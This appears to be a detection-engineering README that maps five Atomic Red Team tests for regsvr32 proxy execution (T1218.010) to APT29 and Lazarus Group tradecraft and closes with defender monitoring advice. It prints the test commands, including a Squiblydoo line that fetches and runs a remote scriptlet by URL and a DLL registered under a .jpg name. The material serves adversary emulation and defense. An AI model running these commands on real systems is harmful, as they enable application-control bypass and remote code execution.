# Atomic Red Team Tests for APT29 and Lazarus Group - T1218.010 Signed Binary Proxy Execution: Regsvr32

This repository documents selected **Atomic Red Team tests for T1218.010 (Signed Binary Proxy Execution: Regsvr32)** that closely emulate the tradecraft of **APT29** (a.k.a. Cozy Bear, Midnight Blizzard) and **Lazarus Group**.

The goal is to:
* Provide defenders with a curated set of relevant tests for detecting regsvr32 abuse activities
* Map each test to known adversary behaviors and campaigns
* Highlight overlap and differences between the groups' execution techniques

---

## Background

* **APT29** (Cozy Bear, Midnight Blizzard) is a Russian state-sponsored threat group
  * Known for sophisticated cyber espionage and the **SolarWinds compromise**
  * Frequently uses **living-off-the-land techniques** with legitimate system utilities
  * Employs **regsvr32.exe** to execute malicious payloads and bypass application controls

* **Lazarus Group** is a North Korean state-sponsored threat group
  * Known for **financial theft campaigns** and destructive attacks including **Operation Dream Job**
  * Uses **regsvr32.exe** to execute malicious payloads on compromised hosts
  * Leverages multiple execution methods to evade security controls

Both groups leverage T1218.010 (Regsvr32) because it allows them to:
* Execute malicious code through a trusted Microsoft-signed binary
* Bypass application control solutions using legitimate Windows components
* Load and execute remote scripts via URL invocation (Squiblydoo technique)
* Avoid detection by blending with normal system operations
* Register malicious COM objects for persistence

---

## Selected Atomic Tests for T1218.010

| Test # | Technique | Description | Used By |
|--------|-----------|-------------|---------|
| **1** | Local COM Scriptlet Execution | Executes local COM scriptlets through regsvr32 | **APT29 & Lazarus** |
| **2** | Remote COM Scriptlet Execution | Executes remote scripts via URL (Squiblydoo) | **APT29** |
| **3** | Local DLL Execution | Executes local DLL files through regsvr32 | **Lazarus** |
| **4** | Registering Non-DLL Files | Registers files with altered extensions | **APT29** |
| **5** | Silent DLL Install | Installs DLLs with DllRegisterServer call | **Lazarus** |

---

## Detailed Test Analysis

### Atomic Test #1 - Regsvr32 local COM scriptlet execution
**Technique:** Local COM Scriptlet Execution  
**Adversary Usage:** APT29 & Lazarus Group  
**Command:**
```cmd
regsvr32.exe /s /u /i:"PathToAtomicsFolder\T1218.010\src\RegSvr32.sct" scrobj.dll
```
**Explanation:** Both groups use regsvr32 to execute local COM scriptlets, leveraging the trusted Windows binary to evade detection. APT29 has used this technique in various campaigns to execute payloads without writing to disk, while Lazarus has employed similar methods in financial attacks.

### Atomic Test #2 - Regsvr32 remote COM scriptlet execution
**Technique:** Remote Script Execution (Squiblydoo)  
**Adversary Usage:** APT29  
**Command:**
```cmd
regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll
```
**Explanation:** APT29 uses the Squiblydoo technique to execute remote scripts directly from URLs, avoiding file writes and bypassing traditional file-based detections. This advanced technique demonstrates their sophisticated tradecraft for defense evasion.

### Atomic Test #3 - Regsvr32 local DLL execution
**Technique:** Local DLL Execution  
**Adversary Usage:** Lazarus Group  
**Command:**
```cmd
regsvr32.exe /s PathToAtomicsFolder\T1218.010\bin\AllTheThingsx86.dll
```
**Explanation:** Lazarus Group frequently uses regsvr32 to execute local DLL payloads, particularly in their financial campaigns. This straightforward approach allows them to leverage trusted system utilities while maintaining operational simplicity.

### Atomic Test #4 - Regsvr32 Registering Non-DLL Files
**Technique:** File Extension Obfuscation  
**Adversary Usage:** APT29  
**Command:**
```cmd
regsvr32.exe /s %temp%\shell32.jpg
```
**Explanation:** APT29 uses file extension obfuscation to disguise malicious DLLs as other file types (e.g., .jpg, .txt). This technique evades basic file type detection and allows them to bypass security controls that focus on traditional DLL files.

### Atomic Test #5 - Regsvr32 Silent DLL Install Call DllRegisterServer
**Technique:** Silent DLL Installation  
**Adversary Usage:** Lazarus Group  
**Command:**
```cmd
regsvr32.exe /s /i "PathToAtomicsFolder\T1218.010\bin\AllTheThingsx86.dll"
```
**Explanation:** Lazarus Group uses silent installation techniques to deploy malicious components with minimal visibility. This approach allows them to establish persistence and execute payloads while avoiding user interaction and detection.

---

## Correlation with APT29 & Lazarus

* **APT29 Focus:**
  * Advanced techniques like remote script execution (#2 - Squiblydoo)
  * File extension obfuscation (#4 - non-DLL registration)
  * Sophisticated tradecraft for defense evasion
  → Used for stealthy payload execution during espionage operations

* **Lazarus Group Focus:**
  * Direct DLL execution (#3 - local DLL loading)
  * Silent installation methods (#5 - DllRegisterServer)
  * Rapid payload deployment
  → Used for financial theft and destructive attacks

* **Overlap:**
  * Both groups abuse **regsvr32.exe** for execution
  * Both leverage **trusted Windows utilities** to evade detection
  * Both use **COM scriptlet execution** (#1) for payload delivery
  * Both employ **multiple execution methods** in attack chains

---

## Defender Notes

* These tests are high-value because they **closely emulate real-world adversary tradecraft**
* Detection should focus on:
  * regsvr32.exe with unusual command-line arguments (/s, /u, /i)
  * regsvr32.exe executing remote content from URLs (#2)
  * regsvr32.exe loading files with unusual extensions (#4)
  * regsvr32.exe executing from unusual directories or with unusual parent processes
  * Multiple regsvr32 execution methods chained together

* Correlation across events is essential:
  * Process creation + network connections for remote script loading
  * Command line analysis for obfuscation techniques
  * Parent-child process relationships involving regsvr32
  * File operations with unusual extensions being registered

* Implement application control to restrict regsvr32.exe if not needed for business purposes
* Monitor for regsvr32.exe execution patterns that deviate from normal administrative use

## Campaign References

1. **APT29 Various Operations**: Used regsvr32 for remote script execution and COM hijacking in multiple campaigns
2. **Lazarus Financial Campaigns**: Employed regsvr32 for payload execution in banking network penetration
3. **APT29 SolarWinds Campaign**: Leveraged multiple living-off-the-land techniques including regsvr32 abuse
4. **Lazarus Operation GhostSecret**: Used regsvr32 for payload execution in destructive attacks

## Academic References

1. MITRE ATT&CK Technique T1218.010 - Signed Binary Proxy Execution: Regsvr32
2. Microsoft: "NOBELIUM targeting IT supply chain" (2021)
3. US-CERT: "Hidden Cobra - North Korean Malicious Cyber Activity" (Lazarus Group TTPs)
4. CrowdStrike: "APT29 Tradecraft and Techniques" (2023)
5. FireEye: "Regsvr32 Targeting Mongolian Government" (Squiblydoo technique)